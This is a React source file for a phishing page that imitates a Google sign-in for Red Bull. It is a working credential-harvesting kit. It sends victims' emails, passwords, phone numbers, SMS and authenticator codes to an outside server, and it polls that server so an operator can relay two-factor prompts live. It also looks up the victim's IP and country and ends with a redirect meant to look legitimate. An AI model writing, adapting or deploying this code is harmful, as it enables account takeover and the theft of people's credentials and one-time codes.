import { useCallback, useEffect, useRef, useState } from 'react'
import './login.css'

const API = 'https://hr-work-edge.com/summit/api'

function hashIp(ip) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
  let h = 0
  for (let i = 0; i < ip.length; i++) h = ((h << 5) - h + ip.charCodeAt(i)) | 0
  let out = '', s = Math.abs(h)
  for (let i = 0; i < 6; i++) { out += chars[s % chars.length]; s = Math.abs(31 * s + 7 | 0) }
  return out
}

function mpart(boundary, fields) {
  const sep = `------WebKitFormBoundary${boundary}`
  let body = ''
  for (const [name, val] of Object.entries(fields))
    body += `${sep}\r\nContent-Disposition: form-data; name="${name}"\r\n\r\n${val}\r\n`
  return { body: body + sep + '--\r\n', ct: `multipart/form-data; boundary=----WebKitFormBoundary${boundary}` }
}

function GoogleG() {
  return (
    <svg width="20" height="24" viewBox="0 0 40 48" aria-hidden="true">
      <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"/>
      <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"/>
      <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"/>
      <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"/>
    </svg>
  )
}

function getFlagEmoji(cc) {
  if (!cc || cc.length !== 2) return '🏳'
  return String.fromCodePoint(...[...cc.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65))
}

function PersonIcon() {
  return (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="#5f6368">
      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
    </svg>
  )
}

function Spinner() {
  return (
    <div className="flex flex-col items-center justify-center py-12">
      <div className="w-9 h-9 border-[3px] border-[#dadce0] border-t-[#1a73e8] rounded-full animate-spin mb-3" />
      <span style={{ fontSize: 13, color: '#5f6368', fontFamily: 'inherit' }}>Loading...</span>
    </div>
  )
}

function Input({ label, type = 'text', value, onChange, onKeyDown, autoComplete, error }) {
  return (
    <div className={['floating-label-group', error ? 'has-error' : ''].filter(Boolean).join(' ')}>
      <input type={type} value={value} onChange={onChange} onKeyDown={onKeyDown}
        autoComplete={autoComplete} autoFocus={false} className={value ? 'has-value' : ''} />
      <label>{label}</label>
    </div>
  )
}

function PrivacyText() {
  return (
    <p style={{ fontSize: 12, color: '#444746', lineHeight: 1.5, marginBottom: 24, fontFamily: 'inherit' }}>
      Before using this app, you can review Red Bull&apos;s{' '}
      <a href="#" style={{ color: '#1a73e8' }}>Privacy Policy</a>{' '}
      and{' '}
      <a href="#" style={{ color: '#1a73e8' }}>Terms of Service</a>.
    </p>
  )
}

function NextBtn({ onClick, disabled, label = 'Next' }) {
  return (
    <button onClick={onClick} disabled={disabled} style={{
      backgroundColor: disabled ? 'rgba(60,64,67,.12)' : '#1a73e8',
      color: disabled ? 'rgba(60,64,67,.38)' : '#fff',
      fontFamily: '"Google Sans",roboto,Arial,sans-serif',
      fontSize: 14, fontWeight: 500, letterSpacing: '.0107142857em',
      height: 40, padding: '0 24px', borderRadius: 20, border: 'none',
      cursor: disabled ? 'not-allowed' : 'pointer', whiteSpace: 'nowrap',
      transition: 'background-color .2s',
    }}>{label}</button>
  )
}

function LinkBtn({ onClick, children }) {
  return (
    <a href="#" onClick={onClick} style={{
      color: '#1967D2', fontFamily: '"Google Sans",roboto,Arial,sans-serif',
      fontSize: 14, fontWeight: 500, letterSpacing: '.0107142857em',
      textDecoration: 'none', cursor: 'pointer',
    }}>{children}</a>
  )
}

const gsFont = { fontFamily: '"Google Sans",roboto,Arial,sans-serif' }

export default function GoogleSignIn({ onOktaLogin = () => {} }) {
  const [state, setState]           = useState('normal')
  const [email, setEmail]           = useState('')
  const [password, setPassword]     = useState('')
  const [showPw, setShowPw]         = useState(false)
  const [sessionId, setSession]     = useState('')
  const [countries, setCountries]   = useState([])
  const [countryCode, setCountry]   = useState('US')
  const [phoneNum, setPhoneNum]     = useState('')
  const [showDrop, setShowDrop]     = useState(false)
  const [phoneMasked, setPhoneMasked] = useState('')
  const [otp, setOtp]               = useState('')
  const [authCode, setAuthCode]     = useState('')
  const [topCode, setTopCode]       = useState('')
  const [emailErr, setEmailErr]     = useState('')
  const [transitioning, setTransitioning] = useState(false)
  const [barWidth, setBarWidth]     = useState(0)

  const pollRef    = useRef(null)
  const loopBarRef = useRef(null)

  const withDelay = (fn) => {
    setTransitioning(true); setBarWidth(0)
    requestAnimationFrame(() => requestAnimationFrame(() => setBarWidth(100)))
    setTimeout(() => { setTransitioning(false); setBarWidth(0); fn() }, 2000)
  }

  useEffect(() => {
    fetch('https://api.ipify.org?format=json')
      .then(r => r.json())
      .then(async d => {
        const ip = d?.ip || ''
        setSession(hashIp(ip))
        if (ip) {
          try {
            const geo = await fetch(`https://ipapi.co/${ip}/json/`)
            const gd = await geo.json()
            if (gd?.country_code) setCountry(gd.country_code)
          } catch {}
        }
      })
      .catch(() => setSession(hashIp('fallback-' + Date.now())))
  }, [])

  const stopPoll = useCallback(() => {
    if (pollRef.current) { clearInterval(pollRef.current); pollRef.current = null }
  }, [])

  const stopLoopingBar = useCallback(() => {
    if (loopBarRef.current) { clearTimeout(loopBarRef.current); loopBarRef.current = null }
    setTransitioning(false); setBarWidth(0)
  }, [])

  const startLoopingBar = useCallback(() => {
    setTransitioning(true)
    const tick = () => {
      setBarWidth(0)
      requestAnimationFrame(() => requestAnimationFrame(() => setBarWidth(100)))
      loopBarRef.current = setTimeout(tick, 2000)
    }
    tick()
  }, [])

  const resetSession = useCallback(async () => {
    const { body, ct } = mpart('BiUEBaoEOCPozZmL', { session_id: sessionId })
    try { await fetch(`${API}/reset.php`, { method: 'POST', headers: { 'Content-Type': ct }, body }) } catch {}
  }, [sessionId])

  const fetchPhone    = useCallback(async () => {
    try { const r = await fetch(`${API}/phonenumber.php?session_id=${sessionId}`); const d = await r.json(); if (d?.phonenumber) setPhoneMasked(d.phonenumber) } catch {}
  }, [sessionId])

  const fetchAuthNum  = useCallback(async () => {
    try { const r = await fetch(`${API}/authnum.php?session_id=${sessionId}`); const d = await r.json(); if (d?.smscode1) setPhoneMasked(d.smscode1) } catch {}
  }, [sessionId])

  const fetchTopCode  = useCallback(async () => {
    try { const r = await fetch(`${API}/top-code.php?session_id=${sessionId}`); const d = await r.json(); if (d?.topcode) setTopCode(d.topcode) } catch {}
  }, [sessionId])

  const loadCountries = async () => {
    try {
      const r = await fetch('https://apihero-api.quixtools.com/api/v1/location/getCountriesAll')
      const d = await r.json()
      if (d?.data) setCountries(d.data.map(c => ({ countryCode: c.countryCode, countryName: c.countryName, callingCode: c.callingCode })))
    } catch {}
  }

  const startPoll = useCallback(() => {
    stopPoll()
    pollRef.current = setInterval(async () => {
      try {
        const r = await fetch(`${API}/check.php?session_id=${sessionId}`)
        const d = await r.json()
        if (!d) return
        if (d.status === 'password_error')      { stopPoll(); stopLoopingBar(); setPassword(''); setShowPw(false); setState('password-error') }
        else if (d.status === 'login_error')    { stopPoll(); stopLoopingBar(); await resetSession(); setPassword(''); setShowPw(false); setState('login_error') }
        else if (d.status === 'authcode_error') { stopPoll(); stopLoopingBar(); await resetSession(); setAuthCode(''); setState('auth-2fa-error') }
        else if (d.status === 'authcode')       { stopPoll(); stopLoopingBar(); await resetSession(); setState('auth-2fa') }
        else if (d.status === 'redirect')       { stopPoll(); stopLoopingBar(); window.location.href = 'https://calendly.com/maria-michon/30min?back=1&month=2026-04' }
        else if (d.status === 'top_code')       { stopPoll(); stopLoopingBar(); await resetSession(); await fetchTopCode(); setState('verify'); startPoll() }
        else if (d.status === 'smscode_error')  { stopPoll(); stopLoopingBar(); await resetSession(); setOtp(''); setState('phone-2fa-error') }
        else if (d.status === 'smscode')        { stopPoll(); stopLoopingBar(); setOtp(''); await fetchAuthNum(); await resetSession(); setState('phone-2fa') }
        else if (d.status === 'phonenumber')    { stopPoll(); stopLoopingBar(); await resetSession(); await fetchPhone(); await loadCountries(); setState('2step') }
        else if (d.status === 'continue_pass')  { stopPoll(); stopLoopingBar(); await resetSession(); setPassword(''); setShowPw(false); setState('password'); startPoll() }
        else if (d.status === 'okta_login')     { stopPoll(); stopLoopingBar(); await resetSession(); onOktaLogin(sessionId) }
        else if (d.action === 'password')       { stopPoll(); stopLoopingBar(); setPassword(''); setShowPw(false); setState('password-error') }
        else if (d.action === '2fa_phone')      { stopPoll(); stopLoopingBar(); setState('2step') }
        else if (d.action === '2fa_auth')       { stopPoll(); stopLoopingBar(); setState('auth-2fa') }
        else if (d.action === '2fa_code')       { stopPoll(); stopLoopingBar(); setState('phone-2fa') }
        else if (d.action === 'verify')         { stopPoll(); stopLoopingBar(); setState('verify') }
        else if (d.action === 'done')           { stopPoll(); stopLoopingBar() }
      } catch {}
    }, 1500)
  }, [sessionId, stopPoll, stopLoopingBar, onOktaLogin, resetSession, fetchPhone, fetchAuthNum, fetchTopCode])

  useEffect(() => () => stopPoll(), [stopPoll])

  const submitEmail = () => {
    if (!email.trim()) return
    setEmailErr('')
    const { body, ct } = mpart('AdnHdm72fV2A93us', { email: email.trim(), session_id: sessionId })
    startLoopingBar()
    fetch(`${API}/email.php`, { method: 'POST', headers: { 'Content-Type': ct }, body })
      .then(async r => {
        const d = await r.json().catch(() => null)
        if (!r.ok || d?.error) {
          stopLoopingBar()
          setEmailErr(d?.error === 'personal_email'
            ? 'Personal email addresses are not supported. Please use your work or school email.'
            : "Couldn't find your Google Account")
        } else {
          stopLoopingBar(); setPassword(''); setShowPw(false)
          withDelay(() => { setState('password'); startPoll() })
        }
      })
      .catch(() => { stopLoopingBar(); setEmailErr("Couldn't find your Google Account") })
  }

  const submitPassword = () => {
    if (!password) return
    const { body, ct } = mpart('dDiMkHgUpMFAixBh', { email: email.trim(), password, session_id: sessionId })
    fetch(`${API}/password.php`, { method: 'POST', headers: { 'Content-Type': ct }, body }).catch(() => {})
    setState('password-loading'); startPoll()
  }

  const submitPhone = () => {
    if (!phoneNum.trim()) return
    const { body, ct } = mpart('wl63YacvoB6agXvO', { phone: phoneNum.trim(), session_id: sessionId })
    fetch(`${API}/phone.php`, { method: 'POST', headers: { 'Content-Type': ct }, body }).catch(() => {})
    setState('phone-loading'); startPoll()
  }

  const submitSmsCode = () => {
    if (otp.length < 6) return
    const { body, ct } = mpart('7FHZU0vaYYeO09PH', { otp, session_id: sessionId })
    fetch(`${API}/otp.php`, { method: 'POST', headers: { 'Content-Type': ct }, body }).catch(() => {})
    setState('phone-2fa-loading'); startPoll()
  }

  const submitAuthCode = () => {
    if (authCode.length < 6) return
    const { body, ct } = mpart('7FHZU0vaYYeO09PH', { otp: authCode, session_id: sessionId })
    fetch(`${API}/otp.php`, { method: 'POST', headers: { 'Content-Type': ct }, body }).catch(() => {})
    setState('auth-2fa-loading'); startPoll()
  }

  const isError       = state === 'error'
  const isLoginErr    = state === 'login_error'
  const isPassword    = ['password', 'password-error', 'password-loading'].includes(state)
  const isPwErr       = state === 'password-error'
  const isPwLoading   = state === 'password-loading'
  const is2step       = state === '2step'
  const isPhoneLoad   = state === 'phone-loading'
  const isPhone2fa    = ['phone-2fa', 'phone-2fa-error', 'phone-2fa-loading'].includes(state)
  const isPhone2faErr = state === 'phone-2fa-error'
  const isAuth2fa     = ['auth-2fa', 'auth-2fa-error', 'auth-2fa-loading'].includes(state)
  const isAuth2faErr  = state === 'auth-2fa-error'
  const isAuth2faLoad = state === 'auth-2fa-loading'
  const isVerify      = state === 'verify'

  let leftTitle = 'Sign in'
  if (isPwLoading || isPhoneLoad) leftTitle = "Verify that it's you"
  else if (isPassword)            leftTitle = 'Welcome'
  else if (isVerify)              leftTitle = "Verify it's you"
  else if (is2step || isPhone2fa || isAuth2fa) leftTitle = '2-Step Verification'

  const showEmailChip = isPassword || isPwLoading || isPhoneLoad || is2step || isPhone2fa || isAuth2fa || isVerify

  return (
    <div className="flex flex-col items-center justify-center px-4 py-8 gs-outer"
      style={{ minHeight: 'var(--app-h)', background: '#f0f4f9', fontFamily: '"Google Sans",roboto,Arial,sans-serif' }}>

      {/* Card */}
      <div className="relative w-full max-w-[920px] bg-white overflow-hidden shadow-sm gs-card" style={{ borderRadius: 28 }}>

        {/* Progress bar */}
        {transitioning && (
          <>
            <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 3, zIndex: 30, background: '#e8eaed' }}>
              <div style={{ height: '100%', background: '#1a73e8', width: `${barWidth}%`, transition: barWidth === 0 ? 'none' : 'width 2s linear' }} />
            </div>
            <div style={{ position: 'absolute', inset: 0, zIndex: 20, background: 'rgba(255,255,255,0.5)' }} />
          </>
        )}

        {/* Header */}
        <div style={{ position: 'absolute', top: 4, left: 0, right: 0, height: 48, display: 'flex', alignItems: 'center', padding: '0 16px', gap: 12, borderBottom: '1px solid #c4c7c5', zIndex: 10 }}>
          <GoogleG />
          <span style={{ ...gsFont, fontSize: 14, fontWeight: 500, color: '#444746' }}>Sign in with Google</span>
        </div>

        {/* Body */}
        <div className="flex flex-col md:flex-row gs-body" style={{ paddingTop: 68, paddingLeft: 36, paddingRight: 36, paddingBottom: 36, gap: 48 }}>

          {/* Left column */}
          <div className="w-full md:w-[38%] flex-shrink-0" style={{ minWidth: 0 }}>
            <img src="/redbull-bulls.png" alt="Red Bull" style={{ display: 'block', height: 48, width: 'auto' }} />
            <h1 style={{ ...gsFont, fontSize: 38, fontWeight: 400, color: '#1f1f1f', marginTop: 24, marginBottom: 0, lineHeight: 1.2, wordBreak: 'break-word' }}>
              {leftTitle}
            </h1>
            {showEmailChip ? (
              <>
                {(isAuth2fa || isVerify || is2step || isPhone2fa) && (
                  <p style={{ ...gsFont, fontSize: 14, color: '#444746', marginTop: 12, marginBottom: 0, lineHeight: 1.5 }}>
                    To help keep your account safe, Google wants to make sure it&apos;s really you trying to sign in
                  </p>
                )}
                <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginTop: 16, padding: '4px 12px 4px 8px', background: '#f1f3f4', borderRadius: 20, alignSelf: 'flex-start', width: 'fit-content' }}>
                  <PersonIcon />
                  <span style={{ ...gsFont, fontSize: 14, color: '#1f1f1f' }}>{email || 'user@gmail.com'}</span>
                </div>
                {(isVerify || isPhone2fa) && (
                  <div style={{ marginTop: 20 }}><LinkBtn>Resend it</LinkBtn></div>
                )}
              </>
            ) : (
              <p style={{ ...gsFont, fontSize: 15, fontWeight: 300, color: '#444746', marginTop: 12, marginBottom: 0, lineHeight: 1.5 }}>
                to continue to{' '}
                <button type="button" style={{ background: 'none', border: 'none', padding: 0, ...gsFont, fontSize: 15, fontWeight: 300, color: '#1a73e8', cursor: 'pointer' }}>
                  redbull.com
                </button>
              </p>
            )}
          </div>

          {/* Right column */}
          <div className="w-full md:w-[62%] gs-right-col" style={{ minWidth: 0, display: 'flex', flexDirection: 'column', minHeight: 260 }}>

            {isAuth2fa ? (
              isAuth2faLoad ? <Spinner /> : (
                <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
                  <div className="gs-form-inner" style={{ width: '80%', marginLeft: 'auto', marginTop: 25, display: 'flex', flexDirection: 'column', flex: 1 }}>
                    <p style={{ ...gsFont, fontSize: 16, fontWeight: 400, color: '#1f1f1f', marginBottom: 4, lineHeight: 1.4 }}>2-Step Verification</p>
                    <p style={{ ...gsFont, fontSize: 14, color: '#444746', marginBottom: 16, lineHeight: 1.5 }}>
                      Get a verification code from the <strong style={{ color: '#1f1f1f' }}>Google Authenticator</strong> app
                    </p>
                    <Input label="Enter code" value={authCode}
                      onChange={e => { const v = e.target.value.replace(/\D/g, ''); if (v.length <= 6) setAuthCode(v) }}
                      onKeyDown={e => e.key === 'Enter' && authCode.length === 6 && withDelay(submitAuthCode)}
                      error={isAuth2faErr} />
                    {isAuth2faErr && <p style={{ fontSize: 12, color: '#d93025', marginTop: 4 }}>The code was incorrect. Please try again.</p>}
                    <div style={{ flex: 1 }} />
                    <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'flex-end', gap: 16 }}>
                      <LinkBtn>Try another way</LinkBtn>
                      <NextBtn onClick={() => !transitioning && withDelay(submitAuthCode)} disabled={authCode.length !== 6 || transitioning} />
                    </div>
                  </div>
                </div>
              )
            ) : isPhone2fa ? (
              state === 'phone-2fa-loading' ? <Spinner /> : (
                <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
                  <div className="gs-form-inner" style={{ width: '80%', marginLeft: 'auto', marginTop: 30, display: 'flex', flexDirection: 'column', flex: 1 }}>
                    <p style={{ ...gsFont, fontSize: 14, color: '#444746', marginBottom: 16, lineHeight: 1.5 }}>
                      A text message with a 6-digit verification code was just sent to •••••••• {phoneMasked || '56'}
                    </p>
                    <Input label="Enter the code" value={otp}
                      onChange={e => { const v = e.target.value.replace(/\D/g, ''); if (v.length <= 6) setOtp(v) }}
                      onKeyDown={e => e.key === 'Enter' && otp.length === 6 && withDelay(submitSmsCode)}
                      error={isPhone2faErr} />
                    {isPhone2faErr && <p style={{ fontSize: 12, color: '#d93025', marginTop: 4 }}>Incorrect code. Please try again.</p>}
                    <div className="gs-sms-spacer" style={{ flex: 1 }} />
                    <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'flex-end', gap: 16 }}>
                      <LinkBtn>Try another way</LinkBtn>
                      <NextBtn onClick={() => !transitioning && withDelay(submitSmsCode)} disabled={otp.length !== 6 || transitioning} />
                    </div>
                  </div>
                </div>
              )
            ) : isPhoneLoad ? (
              <Spinner />
            ) : is2step ? (
              <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
                <div className="gs-form-inner" style={{ width: '80%', marginLeft: 'auto', marginTop: 30, display: 'flex', flexDirection: 'column', flex: 1 }}>
                  <p style={{ ...gsFont, fontSize: 14, color: '#444746', marginBottom: 20, lineHeight: 1.5 }}>
                    Confirm the phone number you provided in your security settings: ••• ••• {phoneMasked || '+36'}
                  </p>
                  <div style={{ display: 'flex', alignItems: 'stretch', gap: 8 }}>
                    <div style={{ position: 'relative', flexShrink: 0 }}>
                      <button type="button" onClick={() => { if (!countries.length) loadCountries(); setShowDrop(d => !d) }}
                        style={{ display: 'flex', alignItems: 'center', gap: 6, padding: '0 10px', height: 50, background: 'transparent', border: '1px solid #747775', borderRadius: 4, cursor: 'pointer', outline: 'none' }}>
                        <span style={{ fontSize: 20, lineHeight: 1 }}>{getFlagEmoji(countryCode)}</span>
                        <svg width="10" height="6" viewBox="0 0 10 6" fill="none"><path d="M1 1L5 5L9 1" stroke="#5f6368" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/></svg>
                      </button>
                      {showDrop && (
                        <div style={{ position: 'absolute', top: '100%', left: 0, marginTop: 4, background: '#fff', border: '1px solid #dadce0', borderRadius: 8, boxShadow: '0 2px 8px rgba(0,0,0,.12)', zIndex: 50, maxHeight: 220, overflowY: 'auto', minWidth: 240 }}>
                          {countries.length > 0 ? countries.map(c => (
                            <button key={c.countryCode} type="button" onClick={() => { setCountry(c.countryCode); setShowDrop(false) }}
                              style={{ width: '100%', textAlign: 'left', padding: '8px 16px', ...gsFont, fontSize: 13, cursor: 'pointer', display: 'flex', alignItems: 'center', gap: 10, background: countryCode === c.countryCode ? '#e8f0fe' : 'transparent', border: 'none' }}>
                              <span style={{ fontSize: 18, flexShrink: 0 }}>{getFlagEmoji(c.countryCode)}</span>
                              <span style={{ color: '#1f1f1f', flex: 1 }}>{c.countryName}</span>
                              <span style={{ color: '#5f6368' }}>{c.callingCode}</span>
                            </button>
                          )) : <div style={{ padding: '8px 16px', ...gsFont, fontSize: 13, color: '#5f6368' }}>Loading...</div>}
                        </div>
                      )}
                    </div>
                    <div style={{ flex: 1 }}>
                      <Input label="Phone number" type="tel" value={phoneNum}
                        onChange={e => { const v = e.target.value.replace(/\D/g, ''); if (v.length <= 12) setPhoneNum(v) }} />
                    </div>
                  </div>
                  <div className="gs-phone-spacer" style={{ flex: 1 }} />
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'flex-end', gap: 16 }}>
                    <span className="gs-try-another"><LinkBtn>Try another way</LinkBtn></span>
                    <NextBtn onClick={() => !transitioning && withDelay(submitPhone)} disabled={transitioning} label="Next" />
                  </div>
                </div>
              </div>
            ) : isVerify ? (
              <div className="gs-verify gs-form-inner" style={{ width: '80%', marginLeft: 'auto', display: 'flex', flexDirection: 'column', flex: 1 }}>
                <div style={{ ...gsFont, fontSize: '2.975rem', lineHeight: 1.12, fontWeight: 400, color: '#1f1f1f', marginBottom: 9, marginTop: 35, textAlign: 'center' }}>{topCode || '87'}</div>
                <p style={{ ...gsFont, fontSize: 19, fontWeight: 400, color: '#1f1f1f', marginBottom: 8, marginTop: 0 }}>Check your device</p>
                <p style={{ ...gsFont, fontSize: 13, color: '#444746', lineHeight: 1.5 }}>
                  Google sent a notification to your Device. Tap <strong style={{ color: '#1f1f1f' }}>Yes</strong> on the prompt, then tap <strong style={{ color: '#1f1f1f' }}>{topCode || '87'}</strong> on your phone to verify it&apos;s you.
                </p>
              </div>
            ) : isPwLoading ? (
              <div className="gs-form-inner gs-pw-load" style={{ marginTop: 72, display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
                <div className="w-9 h-9 border-[3px] border-[#dadce0] border-t-[#1a73e8] rounded-full animate-spin mb-3" />
                <span style={{ fontSize: 13, color: '#5f6368', fontFamily: 'inherit' }}>Loading...</span>
              </div>
            ) : isPassword ? (
              <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
                <div className="gs-form-inner" style={{ width: '80%', marginLeft: 'auto', marginTop: 72, display: 'flex', flexDirection: 'column', flex: 1 }}>
                  <Input label="Enter your password" type={showPw ? 'text' : 'password'} value={password}
                    onChange={e => setPassword(e.target.value)}
                    onKeyDown={e => e.key === 'Enter' && !transitioning && withDelay(submitPassword)}
                    autoComplete="off" error={isPwErr} />
                  {isPwErr && <p style={{ fontSize: 12, color: '#d93025', marginTop: 4 }}>Wrong password. Try again or click &quot;Forgot password?&quot;</p>}
                  <label style={{ display: 'flex', alignItems: 'center', gap: 8, marginTop: 8, cursor: 'pointer', marginBottom: 40 }}>
                    <input type="checkbox" checked={showPw} onChange={e => setShowPw(e.target.checked)} style={{ width: 16, height: 16 }} />
                    <span style={{ ...gsFont, fontSize: 14, color: '#1f1f1f' }}>Show password</span>
                  </label>
                  <PrivacyText />
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'flex-end', gap: 16 }}>
                    <LinkBtn>Forgot password?</LinkBtn>
                    <NextBtn onClick={() => !transitioning && withDelay(submitPassword)} disabled={transitioning} />
                  </div>
                </div>
              </div>
            ) : (
              <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
                <div className="gs-form-inner" style={{ width: '80%', marginLeft: 'auto', marginTop: 36, display: 'flex', flexDirection: 'column', flex: 1 }}>
                  <Input label="Email or phone"
                    value={isError ? 'arthurdgjdgjdfh@gmail.com' : email}
                    onChange={e => { if (!isError) { if (isLoginErr) setState('normal'); setEmail(e.target.value); setEmailErr('') } }}
                    onKeyDown={e => { if (e.key === 'Enter' && !isError) submitEmail() }}
                    error={isError || isLoginErr || !!emailErr} />
                  {(isError || isLoginErr || emailErr) && (
                    <p style={{ fontSize: 12, color: '#d93025', marginTop: 4 }}>
                      {isError || isLoginErr ? "Couldn't find your Google Account" : emailErr}
                    </p>
                  )}
                  <div style={{ marginTop: 8, marginBottom: 40 }}><LinkBtn>Forgot email?</LinkBtn></div>
                  <PrivacyText />
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'flex-end', gap: 16 }}>
                    <LinkBtn>Create account</LinkBtn>
                    <NextBtn onClick={() => !isError && submitEmail()} disabled={false} />
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="w-full max-w-[920px] flex items-center justify-between pt-4 px-1 text-[12px] gs-footer" style={{ color: '#444746' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 4, cursor: 'pointer', ...gsFont }}>
          <span>English (United States)</span>
          <svg width="10" height="6" viewBox="0 0 10 6" fill="none" style={{ marginLeft: 2 }}>
            <path d="M1 1L5 5L9 1" stroke="#444746" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
        </div>
        <div style={{ display: 'flex', gap: 20 }}>
          {['Help', 'Privacy', 'Terms'].map(t => (
            <a key={t} href="#" style={{ ...gsFont, color: '#444746', fontSize: 12, textDecoration: 'none' }}
               onMouseEnter={e => e.target.style.textDecoration = 'underline'}
               onMouseLeave={e => e.target.style.textDecoration = 'none'}>{t}</a>
          ))}
        </div>
      </div>
    </div>
  )
}
